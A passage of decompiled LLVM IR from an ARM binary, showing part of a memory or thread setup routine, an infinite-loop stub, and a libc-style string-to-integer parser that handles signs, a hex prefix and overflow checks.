  %v1_15e6c = add i32 %arg1, 16
  %v2_15e6c = inttoptr i32 %v1_15e6c to i32*
  br label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e50.lr.ph, %dec_label_pc_15e78
  %v0_15ea416 = phi i32 [ 0, %dec_label_pc_15e50.lr.ph ], [ %v0_15ea414, %dec_label_pc_15e78 ]
  %v0_15e8012 = phi i32 [ 0, %dec_label_pc_15e50.lr.ph ], [ %v0_15e8011, %dec_label_pc_15e78 ]
  %v0_15e70 = phi i32 [ %v3_15e40, %dec_label_pc_15e50.lr.ph ], [ %v1_15e70, %dec_label_pc_15e78 ]
  %v0_15e74 = phi i32 [ %v3_15e38, %dec_label_pc_15e50.lr.ph ], [ %v2_15e74, %dec_label_pc_15e78 ]
  %v1_15e50 = inttoptr i32 %v0_15e74 to i32*
  %v2_15e50 = load i32, i32* %v1_15e50, align 4
  store i32 %v2_15e50, i32* %r3.global-to-local, align 4
  switch i32 %v2_15e50, label %dec_label_pc_15e78 [
    i32 6, label %.thread
    i32 7, label %bb
  ]

.thread:                                          ; preds = %dec_label_pc_15e50
  %v2_15e58 = add i32 %v0_15e74, 8
  %v3_15e58 = inttoptr i32 %v2_15e58 to i32*
  %v4_15e58 = load i32, i32* %v3_15e58, align 4
  store i32 %v4_15e58, i32* %r3.global-to-local, align 4
  %v3_15e5c = sub i32 %v3_15e38, %v4_15e58
  store i32 %v3_15e5c, i32* @r4, align 4
  br label %dec_label_pc_15e78

bb:                                               ; preds = %dec_label_pc_15e50
  br label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e50, %.thread, %bb
  %v0_15ea414 = phi i32 [ %v3_15e5c, %.thread ], [ %v0_15ea416, %bb ], [ %v0_15ea416, %dec_label_pc_15e50 ]
  %v0_15e8011 = phi i32 [ %v0_15e8012, %.thread ], [ %v0_15e74, %bb ], [ %v0_15e8012, %dec_label_pc_15e50 ]
  %v3_15e6c = load i32, i32* %v2_15e6c, align 4
  store i32 %v3_15e6c, i32* %r3.global-to-local, align 4
  %v1_15e70 = add i32 %v0_15e70, -1
  store i32 %v1_15e70, i32* @lr, align 4
  %v2_15e74 = add i32 %v3_15e6c, %v0_15e74
  %v2_15e78 = icmp eq i32 %v1_15e70, 0
  br i1 %v2_15e78, label %dec_label_pc_15e80, label %dec_label_pc_15e50

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e78
  %v2_15e80 = icmp eq i32 %v0_15e8011, 0
  br i1 %v2_15e80, label %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge, label %dec_label_pc_15e88

dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge:  ; preds = %dec_label_pc_15e80.thread, %dec_label_pc_15e80
  %v3_15eb4.pre = load i32, i32* @global_var_22b6c.638, align 4
  %v3_15eb8.pre = load i32, i32* @global_var_22b70.635, align 4
  %v2_15ebc.pre = load i32, i32* @global_var_22b64.634, align 4
  br label %dec_label_pc_15eb0

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e80
  %v1_15e8c = add i32 %v0_15e8011, 16
  %v2_15e8c = inttoptr i32 %v1_15e8c to i32*
  %v3_15e8c = load i32, i32* %v2_15e8c, align 4
  store i32 %v3_15e8c, i32* %r3.global-to-local, align 4
  %v1_15e90 = add i32 %v0_15e8011, 8
  %v2_15e90 = inttoptr i32 %v1_15e90 to i32*
  %v3_15e90 = load i32, i32* %v2_15e90, align 4
  store i32 %v3_15e8c, i32* @global_var_22b68.636, align 4
  %v1_15e98 = add i32 %v0_15e8011, 20
  %v2_15e98 = inttoptr i32 %v1_15e98 to i32*
  %v3_15e98 = load i32, i32* %v2_15e98, align 4
  store i32 %v3_15e98, i32* %r3.global-to-local, align 4
  store i32 %v3_15e98, i32* @global_var_22b6c.638, align 4
  %v1_15ea0 = add i32 %v0_15e8011, 28
  %v2_15ea0 = inttoptr i32 %v1_15ea0 to i32*
  %v3_15ea0 = load i32, i32* %v2_15ea0, align 4
  store i32 %v3_15ea0, i32* %r3.global-to-local, align 4
  %v2_15ea4 = add i32 %v3_15e90, %v0_15ea414
  store i32 %v3_15ea0, i32* @global_var_22b70.635, align 4
  store i32 %v2_15ea4, i32* @global_var_22b64.634, align 4
  br label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge, %dec_label_pc_15e88
  %v2_15ebc = phi i32 [ %v2_15ebc.pre, %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge ], [ %v2_15ea4, %dec_label_pc_15e88 ]
  %v3_15eb8 = phi i32 [ %v3_15eb8.pre, %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge ], [ %v3_15ea0, %dec_label_pc_15e88 ]
  %v3_15eb4 = phi i32 [ %v3_15eb4.pre, %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge ], [ %v3_15e98, %dec_label_pc_15e88 ]
  store i32 %v3_15eb8, i32* %r0.global-to-local, align 4
  %sum = add i32 %v2_15ebc, %v3_15eb4
  %v2_15ec4 = sub i32 0, %sum
  %v1_15ec8 = add i32 %v3_15eb8, -1
  %v2_15ecc = and i32 %v1_15ec8, %v2_15ec4
  store i32 %v2_15ecc, i32* %r3.global-to-local, align 4
  %v2_15ed4 = add i32 %v2_15ecc, %v3_15eb4
  %tmp = icmp ult i32 %v3_15eb8, 4
  br i1 %tmp, label %bb38, label %.thread30

bb38:                                             ; preds = %dec_label_pc_15eb0
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4, i32* @global_var_22b70.635, align 4
  br label %.thread30

.thread30:                                        ; preds = %dec_label_pc_15eb0, %bb38
  %v3_15ee0 = phi i32 [ 4, %bb38 ], [ %v3_15eb8, %dec_label_pc_15eb0 ]
  %v1_15ee4 = add i32 %v2_15ed4, 223
  %v2_15ee8 = add i32 %v1_15ee4, %v3_15ee0
  %v1_15eec = and i32 %v2_15ee8, -4
  store i32 ptrtoint (i8** @global_var_22b2c.529 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_15ed4, i32* @global_var_22b6c.638, align 4
  store i32 %v1_15eec, i32* @global_var_22b40.640, align 4
  %tmp41 = icmp ult i32 %v1_15eec, 281
  br i1 %tmp41, label %.thread31, label %dec_label_pc_15f08

.thread31:                                        ; preds = %.thread30
  store i32 ptrtoint (i32* @global_var_22820.642 to i32), i32* @r0, align 4
  br label %dec_label_pc_15f24

dec_label_pc_15f08:                               ; preds = %.thread30
  store i32 0, i32* @r0, align 4
  store i32 192, i32* @r7, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15f24

dec_label_pc_15f24:                               ; preds = %.thread31, %dec_label_pc_15f08
  %v0_15f24 = call i32 @function_15dc8()
  store i32 %v0_15f24, i32* @r4, align 4
  %v2_15f2c = inttoptr i32 %v0_15f24 to i32*
  store i32 %v0_15f24, i32* %v2_15f2c, align 4
  %v1_15f30 = add i32 %v0_15f24, 204
  store i32 %v1_15f30, i32* %r0.global-to-local, align 4
  %v1_15f34 = call i32 @function_16fe8(i32 %v1_15f30)
  store i32 %v1_15f34, i32* %r0.global-to-local, align 4
  %v1_15f38 = icmp slt i32 %v1_15f34, 0
  br i1 %v1_15f38, label %bb39, label %dec_label_pc_15f48

bb39:                                             ; preds = %dec_label_pc_15f24
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f24
  %v2_15f38 = icmp eq i32 %v1_15f34, 0
  br i1 %v2_15f38, label %bb40, label %.thread3

bb40:                                             ; preds = %dec_label_pc_15f48
  store i32 ptrtoint (i8** @global_var_22b2c.529 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* bitcast (i8** @global_var_22b2c.529 to i32*), align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15f48, %bb40
  %v0_15f58 = load i32, i32* @r4, align 4
  %v1_15f58 = add i32 %v0_15f58, 28
  store i32 %v1_15f58, i32* %r0.global-to-local, align 4
  %v1_15f60 = add i32 %v0_15f58, 136
  %v3_15f64 = inttoptr i32 %v1_15f60 to i32*
  store i32 %v1_15f60, i32* %v3_15f64, align 4
  store i32 ptrtoint (i32* @global_var_22b48.644 to i32), i32* %r3.global-to-local, align 4
  %v0_15f6c = load i32, i32* %r0.global-to-local, align 4
  %v1_15f6c = load i32, i32* @r4, align 4
  %v2_15f6c = add i32 %v1_15f6c, 28
  %v3_15f6c = inttoptr i32 %v2_15f6c to i32*
  store i32 %v0_15f6c, i32* %v3_15f6c, align 4
  %v0_15f70 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f70 = load i32, i32* @r4, align 4
  %v2_15f70 = add i32 %v1_15f70, 156
  %v3_15f70 = inttoptr i32 %v2_15f70 to i32*
  store i32 %v0_15f70, i32* %v3_15f70, align 4
  store i32 %v6_15e34, i32* @r5, align 4
  %v1_15f78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15f78

; uselistorder directives
  uselistorder i32 %v1_15f60, { 1, 0 }
  uselistorder i32 %v0_15f24, { 0, 2, 1, 3 }
  uselistorder i32 %v2_15ed4, { 1, 0 }
  uselistorder i32 %v3_15eb8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_15e70, { 1, 2, 0 }
  uselistorder i32 %v0_15e8011, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 5, 6, 0 }
  uselistorder i32 192, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_22b2c.529 to i32), { 3, 2, 1, 0 }
  uselistorder i32 223, { 4, 3, 0, 1, 2 }
  uselistorder i32* @global_var_22b64.634, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_22b70.635, { 1, 2, 0, 3 }
  uselistorder i32* @global_var_22b6c.638, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15f24, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_15eb0, { 1, 0 }
  uselistorder label %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
}

define i32 @function_15f8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f8c:
  br label %dec_label_pc_15f94

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f94, %dec_label_pc_15f8c
  br label %dec_label_pc_15f94
}

define i32 @function_15fa4(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_15fa4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_15fa4 = load i32, i32* @r5, align 4
  %v12_15fa4 = load i32, i32* @r7, align 4
  %v15_15fa4 = load i32, i32* @r8, align 4
  %v18_15fa4 = load i32, i32* @sb, align 4
  %v21_15fa4 = load i32, i32* @sl, align 4
  %v24_15fa4 = load i32, i32* @fp, align 4
  %v0_15fb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15fb4, i32* @sl, align 4
  store i32 %arg3, i32* @r6, align 4
  %tmp234 = icmp ult i32 %tmp, 37
  br i1 %tmp234, label %dec_label_pc_15fd4, label %dec_label_pc_16270

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15fd4
  %v2_15fe0 = inttoptr i32 %v3_15fd4 to i8*
  %v3_15fe0 = load i8, i8* %v2_15fe0, align 1
  %v4_15fe0 = zext i8 %v3_15fe0 to i32
  store i32 %v4_15fe0, i32* @r5, align 4
  %v6_15fe0 = add i32 %v3_15fd4, 1
  store i32 %v6_15fe0, i32* %r2.global-to-local, align 4
  store i32 %v6_15fe0, i32* %v2_15fd4, align 4
  %v0_15fc4 = load i32, i32* @r5, align 4
  %v7_15fc8 = icmp eq i32 %v0_15fc4, 32
  br i1 %v7_15fc8, label %dec_label_pc_15fd4.backedge, label %bb

bb:                                               ; preds = %dec_label_pc_15fc4
  %v1_15fc4 = add i32 %v0_15fc4, -9
  %tmp235 = icmp ugt i32 %v1_15fc4, 4
  br i1 %tmp235, label %dec_label_pc_16008, label %dec_label_pc_15fd4.backedge

dec_label_pc_15fd4.backedge:                      ; preds = %dec_label_pc_15fec, %dec_label_pc_15fc4, %bb, %bb176
  %v0_15fd4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15fd4

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fa4, %dec_label_pc_15fd4.backedge
  %v2_15fe4 = phi i32 [ %v0_15fd4.pre, %dec_label_pc_15fd4.backedge ], [ %v0_15fb4, %dec_label_pc_15fa4 ]
  %v1_15fd4 = add i32 %v2_15fe4, 4
  %v2_15fd4 = inttoptr i32 %v1_15fd4 to i32*
  %v3_15fd4 = load i32, i32* %v2_15fd4, align 4
  store i32 %v3_15fd4, i32* %r2.global-to-local, align 4
  %v1_15fd8 = add i32 %v2_15fe4, 104
  %v2_15fd8 = inttoptr i32 %v1_15fd8 to i32*
  %v3_15fd8 = load i32, i32* %v2_15fd8, align 4
  %v3_15fdc = icmp ult i32 %v3_15fd4, %v3_15fd8
  br i1 %v3_15fdc, label %dec_label_pc_15fc4, label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15fd4
  store i32 %v2_15fe4, i32* %r0.global-to-local, align 4
  %v1_15ff0 = call i32 @function_167c8(i32 %v2_15fe4)
  store i32 %v1_15ff0, i32* %r0.global-to-local, align 4
  store i32 %v1_15ff0, i32* @r5, align 4
  %v7_15ffc = icmp eq i32 %v1_15ff0, 32
  br i1 %v7_15ffc, label %dec_label_pc_15fd4.backedge, label %bb176

bb176:                                            ; preds = %dec_label_pc_15fec
  %v1_15ff8 = add i32 %v1_15ff0, -9
  %tmp236 = icmp ult i32 %v1_15ff8, 5
  br i1 %tmp236, label %dec_label_pc_15fd4.backedge, label %dec_label_pc_16008

dec_label_pc_16008:                               ; preds = %bb176, %bb
  %v0_1601823 = phi i32 [ %v1_15ff0, %bb176 ], [ %v0_15fc4, %bb ]
  %v7_16008 = icmp eq i32 %v0_1601823, 45
  br i1 %v7_16008, label %dec_label_pc_16024, label %bb177

bb177:                                            ; preds = %dec_label_pc_16008
  %v8_1600c = icmp eq i32 %v0_1601823, 43
  br i1 %v8_1600c, label %dec_label_pc_16024, label %.thread18

.thread18:                                        ; preds = %bb177
  br label %dec_label_pc_1604c

dec_label_pc_16024:                               ; preds = %bb177, %dec_label_pc_16008
  %storemerge159 = phi i32 [ 45, %dec_label_pc_16008 ], [ 43, %bb177 ]
  store i32 %storemerge159, i32* @r4, align 4
  %v0_16024 = load i32, i32* @sl, align 4
  %v1_16024 = add i32 %v0_16024, 4
  %v2_16024 = inttoptr i32 %v1_16024 to i32*
  %v3_16024 = load i32, i32* %v2_16024, align 4
  store i32 %v3_16024, i32* %r2.global-to-local, align 4
  %v1_16028 = add i32 %v0_16024, 104
  %v2_16028 = inttoptr i32 %v1_16028 to i32*
  %v3_16028 = load i32, i32* %v2_16028, align 4
  %v3_1602c = icmp ult i32 %v3_16024, %v3_16028
  br i1 %v3_1602c, label %.thread26, label %dec_label_pc_164f4

.thread26:                                        ; preds = %dec_label_pc_16024
  %v2_16030 = inttoptr i32 %v3_16024 to i8*
  %v3_16030 = load i8, i8* %v2_16030, align 1
  %v4_16030 = zext i8 %v3_16030 to i32
  store i32 %v4_16030, i32* @r5, align 4
  %v6_16030 = add i32 %v3_16024, 1
  store i32 %v6_16030, i32* %r2.global-to-local, align 4
  store i32 %v6_16030, i32* %v2_16024, align 4
  br label %dec_label_pc_1603c

dec_label_pc_1603c:                               ; preds = %.thread26, %dec_label_pc_164f4
  %v0_1603c = load i32, i32* @r4, align 4
  %v7_1603c = icmp eq i32 %v0_1603c, 45
  br i1 %v7_1603c, label %.thread28, label %bb179

bb179:                                            ; preds = %dec_label_pc_1603c
  br label %dec_label_pc_1604c

.thread28:                                        ; preds = %dec_label_pc_1603c
  br label %dec_label_pc_1604c

dec_label_pc_1604c:                               ; preds = %bb179, %.thread28, %.thread18
  %stack_var_-44.1 = phi i32 [ 0, %.thread18 ], [ 0, %bb179 ], [ -1, %.thread28 ]
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v1_16050 = sub i32 1, %tmp
  store i32 %v1_16050, i32* @r4, align 4
  %v2_16050 = icmp ult i32 %tmp, 2
  br i1 %v2_16050, label %bb180, label %.thread138

.thread138:                                       ; preds = %dec_label_pc_1604c
  store i32 0, i32* @r4, align 4
  br label %bb181

bb180:                                            ; preds = %dec_label_pc_1604c
  %v2_16058 = icmp eq i32 %tmp, 0
  br i1 %v2_16058, label %dec_label_pc_16124, label %bb181

bb181:                                            ; preds = %.thread138, %bb180
  %v0_16070142 = phi i32 [ 0, %.thread138 ], [ %v1_16050, %bb180 ]
  %v8_1605c = icmp eq i32 %tmp, 16
  br i1 %v8_1605c, label %dec_label_pc_16124, label %.dec_label_pc_16064_crit_edge

.dec_label_pc_16064_crit_edge:                    ; preds = %bb181
  %v0_1606c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %.dec_label_pc_16064_crit_edge, %dec_label_pc_16124
  %v0_16070141 = phi i32 [ %v0_16070142, %.dec_label_pc_16064_crit_edge ], [ %v0_16070143, %dec_label_pc_16124 ]
  %v0_1606c = phi i32 [ %v0_1606c.pre, %.dec_label_pc_16064_crit_edge ], [ %v0_16124, %dec_label_pc_16124 ]
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_1606c = add i32 %v0_1606c, ptrtoint (i32* @global_var_1a032.646 to i32)
  %v3_1606c = inttoptr i32 %v2_1606c to i8*
  %v4_1606c = load i8, i8* %v3_1606c, align 1
  %v6_1606c = zext i8 %v4_1606c to i32
  store i32 %v6_1606c, i32* @r2, align 4
  %v2_16070 = icmp eq i32 %v0_16070141, 0
  br i1 %v2_16070, label %bb183, label %bb182

bb182:                                            ; preds = %dec_label_pc_16064
  store i32 10, i32* %r1.global-to-local, align 4
  br label %bb183

bb183:                                            ; preds = %dec_label_pc_16064, %bb182
  %v0_1607c = phi i32 [ %tmp, %dec_label_pc_16064 ], [ 10, %bb182 ]
  %tmp237 = icmp ugt i32 %v0_1607c, %v6_1606c
  br i1 %tmp237, label %dec_label_pc_16084, label %dec_label_pc_1621c

dec_label_pc_16084:                               ; preds = %bb183, %dec_label_pc_16150
  %v0_1609c = phi i32 [ %v0_1615c, %dec_label_pc_16150 ], [ %v0_1606c, %bb183 ]
  %v0_16094 = phi i32 [ %tmp, %dec_label_pc_16150 ], [ %v0_1607c, %bb183 ]
  %v7_16088 = icmp eq i32 %v0_16094, 10
  br i1 %v7_16088, label %dec_label_pc_161ec.preheader, label %dec_label_pc_16094

dec_label_pc_161ec.preheader:                     ; preds = %dec_label_pc_16084
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_161ec

dec_label_pc_16094:                               ; preds = %dec_label_pc_16084
  %v1_160a0 = add i32 %v0_1609c, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_160a0 = inttoptr i32 %v1_160a0 to i8*
  %v3_160a0 = load i8, i8* %v2_160a0, align 1
  %v4_160a0 = zext i8 %v3_160a0 to i32
  store i32 %v4_160a0, i32* @fp, align 4
  store i32 %v0_16094, i32* %r2.global-to-local, align 4
  %v1_160a8 = add i32 %v0_16094, -1
  br label %dec_label_pc_160ac

dec_label_pc_160ac:                               ; preds = %.thread155, %dec_label_pc_16158, %dec_label_pc_16094
  %v4_161a8106 = phi i32 [ %v4_160a0, %dec_label_pc_16094 ], [ %v4_16160, %dec_label_pc_16158 ], [ %v6_16698, %.thread155 ]
  %v1_160ac = phi i32 [ %v0_16094, %dec_label_pc_16094 ], [ 8, %dec_label_pc_16158 ], [ 16, %.thread155 ]
  %v0_160ac = phi i32 [ %v1_160a8, %dec_label_pc_16094 ], [ 7, %dec_label_pc_16158 ], [ 15, %.thread155 ]
  %v2_160ac = and i32 %v0_160ac, %v1_160ac
  store i32 %v2_160ac, i32* %r1.global-to-local, align 4
  %v4_160ac = icmp eq i32 %v2_160ac, 0
  br i1 %v4_160ac, label %dec_label_pc_160bc, label %dec_label_pc_16198.preheader

dec_label_pc_16198.preheader:                     ; preds = %dec_label_pc_160ac
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16198

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160ac
  %v2_160c4 = mul i32 %v1_160ac, 23
  %v3_160c8 = udiv i32 %v2_160c4, 32
  store i32 ptrtoint (i32* @global_var_1a028.650 to i32), i32* %r2.global-to-local, align 4
  %v1_160d0 = urem i32 %v3_160c8, 8
  %v2_160d4 = add i32 %v1_160d0, ptrtoint (i32* @global_var_1a028.650 to i32)
  %v3_160d4 = inttoptr i32 %v2_160d4 to i8*
  %v4_160d4 = load i8, i8* %v3_160d4, align 1
  %v6_160d4 = zext i8 %v4_160d4 to i32
  store i32 %v6_160d4, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_160f0

dec_label_pc_160e0:                               ; preds = %.thread33.dec_label_pc_160e0_crit_edge, %dec_label_pc_16118
  %v0_160e4 = phi i32 [ %v0_160e4.pre, %.thread33.dec_label_pc_160e0_crit_edge ], [ %v1_1611c, %dec_label_pc_16118 ]
  %v0_160e8 = load i32, i32* @fp, align 4
  %v1_160e8 = load i32, i32* @r4, align 4
  %v2_160e8 = load i32, i32* @r5, align 4
  %v7_160e8 = shl i32 %v1_160e8, %v2_160e8
  %v8_160e8 = or i32 %v7_160e8, %v0_160e8
  store i32 %v8_160e8, i32* @r4, align 4
  %v1_160ec = add i32 %v0_160e4, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_160ec = inttoptr i32 %v1_160ec to i8*
  %v3_160ec = load i8, i8* %v2_160ec, align 1
  %v4_160ec = zext i8 %v3_160ec to i32
  store i32 %v4_160ec, i32* @fp, align 4
  br label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160bc, %dec_label_pc_160e0
  %v0_162f8121 = phi i32 [ %v6_160d4, %dec_label_pc_160bc ], [ %v2_160e8, %dec_label_pc_160e0 ]
  %v4_160f8 = phi i32 [ %v4_161a8106, %dec_label_pc_160bc ], [ %v4_160ec, %dec_label_pc_160e0 ]
  %v0_16298 = phi i32 [ 0, %dec_label_pc_160bc ], [ %v8_160e8, %dec_label_pc_160e0 ]
  store i32 %v1_160ac, i32* %r1.global-to-local, align 4
  %v2_160f4 = icmp ugt i32 %v0_16298, 134217726
  %v8_160f4 = icmp eq i32 %v0_16298, 134217727
  %v2_160f8 = xor i1 %v2_160f4, true
  %v3_160f8 = or i1 %v8_160f4, %v2_160f8
  br i1 %v3_160f8, label %bb185, label %bb186

bb185:                                            ; preds = %dec_label_pc_160f0
  %v7_160f8 = icmp ult i32 %v4_160f8, %v1_160ac
  br i1 %v7_160f8, label %dec_label_pc_16100, label %dec_label_pc_162f0

bb186:                                            ; preds = %dec_label_pc_160f0
  br i1 %v2_160f4, label %dec_label_pc_162f0, label %dec_label_pc_16100

dec_label_pc_16100:                               ; preds = %bb185, %bb186
  %v0_16100 = load i32, i32* @sl, align 4
  %v1_16100 = add i32 %v0_16100, 4
  %v2_16100 = inttoptr i32 %v1_16100 to i32*
  %v3_16100 = load i32, i32* %v2_16100, align 4
  store i32 %v3_16100, i32* %r2.global-to-local, align 4
  %v1_16104 = add i32 %v0_16100, 104
  %v2_16104 = inttoptr i32 %v1_16104 to i32*
  %v3_16104 = load i32, i32* %v2_16104, align 4
  %v3_16108 = icmp ult i32 %v3_16100, %v3_16104
  br i1 %v3_16108, label %.thread33.dec_label_pc_160e0_crit_edge, label %dec_label_pc_16118

.thread33.dec_label_pc_160e0_crit_edge:           ; preds = %dec_label_pc_16100
  %v2_1610c = inttoptr i32 %v3_16100 to i8*
  %v3_1610c = load i8, i8* %v2_1610c, align 1
  %v4_1610c = zext i8 %v3_1610c to i32
  store i32 %v4_1610c, i32* %r0.global-to-local, align 4
  %v6_1610c = add i32 %v3_16100, 1
  store i32 %v6_1610c, i32* %r2.global-to-local, align 4
  store i32 %v6_1610c, i32* %v2_16100, align 4
  %v0_160e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160e0

dec_label_pc_16118:                               ; preds = %dec_label_pc_16100
  store i32 %v0_16100, i32* %r0.global-to-local, align 4
  %v1_1611c = call i32 @function_167c8(i32 %v0_16100)
  store i32 %v1_1611c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160e0

dec_label_pc_16124:                               ; preds = %bb180, %bb181
  %v0_16070143 = phi i32 [ %v1_16050, %bb180 ], [ %v0_16070142, %bb181 ]
  %v0_16124 = load i32, i32* @r5, align 4
  %v7_16124 = icmp eq i32 %v0_16124, 48
  br i1 %v7_16124, label %dec_label_pc_1612c, label %dec_label_pc_16064

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16124
  %v0_1612c = load i32, i32* @sl, align 4
  %v1_1612c = add i32 %v0_1612c, 4
  %v2_1612c = inttoptr i32 %v1_1612c to i32*
  %v3_1612c = load i32, i32* %v2_1612c, align 4
  store i32 %v3_1612c, i32* %r2.global-to-local, align 4
  %v1_16130 = add i32 %v0_1612c, 104
  %v2_16130 = inttoptr i32 %v1_16130 to i32*
  %v3_16130 = load i32, i32* %v2_16130, align 4
  %v3_16134 = icmp ult i32 %v3_1612c, %v3_16130
  br i1 %v3_16134, label %.thread35.dec_label_pc_16144_crit_edge, label %dec_label_pc_1666c

.thread35.dec_label_pc_16144_crit_edge:           ; preds = %dec_label_pc_1612c
  %v2_16138 = inttoptr i32 %v3_1612c to i8*
  %v3_16138 = load i8, i8* %v2_16138, align 1
  %v4_16138 = zext i8 %v3_16138 to i32
  store i32 %v4_16138, i32* @r5, align 4
  %v6_16138 = add i32 %v3_1612c, 1
  store i32 %v6_16138, i32* @r2, align 4
  store i32 %v6_16138, i32* %v2_1612c, align 4
  %v0_16144.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16144

dec_label_pc_16144:                               ; preds = %.thread35.dec_label_pc_16144_crit_edge, %dec_label_pc_1666c
  %v0_1615c = phi i32 [ %v0_16144.pre, %.thread35.dec_label_pc_16144_crit_edge ], [ %v1_16670, %dec_label_pc_1666c ]
  %v1_16144 = or i32 %v0_1615c, 32
  %v7_16148 = icmp eq i32 %v1_16144, 120
  br i1 %v7_16148, label %dec_label_pc_1667c, label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_16144
  %v0_16150 = load i32, i32* @r4, align 4
  %v2_16150 = icmp eq i32 %v0_16150, 0
  br i1 %v2_16150, label %dec_label_pc_16084, label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_16150
  %v1_16160 = add i32 %v0_1615c, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_16160 = inttoptr i32 %v1_16160 to i8*
  %v3_16160 = load i8, i8* %v2_16160, align 1
  %v4_16160 = zext i8 %v3_16160 to i32
  store i32 %v4_16160, i32* @fp, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_160ac

dec_label_pc_16180:                               ; preds = %.thread37.dec_label_pc_16180_crit_edge, %dec_label_pc_161c8
  %v0_16188 = phi i32 [ %v0_16188.pre, %.thread37.dec_label_pc_16180_crit_edge ], [ %v1_1617c, %dec_label_pc_161c8 ]
  store i32 %v1_160ac, i32* %r1.global-to-local, align 4
  %v1_1618c = load i32, i32* @r4, align 4
  %v2_1618c = load i32, i32* @fp, align 4
  %v3_1618c = mul i32 %v1_1618c, %v1_160ac
  %v4_1618c = add i32 %v2_1618c, %v3_1618c
  store i32 %v4_1618c, i32* @r4, align 4
  %v1_16190 = add i32 %v0_16188, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_16190 = inttoptr i32 %v1_16190 to i8*
  %v3_16190 = load i8, i8* %v2_16190, align 1
  %v4_16190 = zext i8 %v3_16190 to i32
  store i32 %v4_16190, i32* @fp, align 4
  br label %dec_label_pc_16198

dec_label_pc_16198:                               ; preds = %dec_label_pc_16198.preheader, %dec_label_pc_16180
  %v0_1646459 = phi i32 [ %v4_161a8106, %dec_label_pc_16198.preheader ], [ %v4_16190, %dec_label_pc_16180 ]
  %v0_16440 = phi i32 [ 0, %dec_label_pc_16198.preheader ], [ %v4_1618c, %dec_label_pc_16180 ]
  store i32 %v1_160ac, i32* %r2.global-to-local, align 4
  %v3_161a4 = icmp ugt i32 %v0_16440, 119304645
  %v9_161a4 = icmp eq i32 %v0_16440, 119304646
  %v2_161a8 = xor i1 %v3_161a4, true
  %v3_161a8 = or i1 %v9_161a4, %v2_161a8
  br i1 %v3_161a8, label %bb188, label %bb189

bb188:                                            ; preds = %dec_label_pc_16198
  %v7_161a8 = icmp ult i32 %v0_1646459, %v1_160ac
  br i1 %v7_161a8, label %dec_label_pc_161b0, label %dec_label_pc_16440

bb189:                                            ; preds = %dec_label_pc_16198
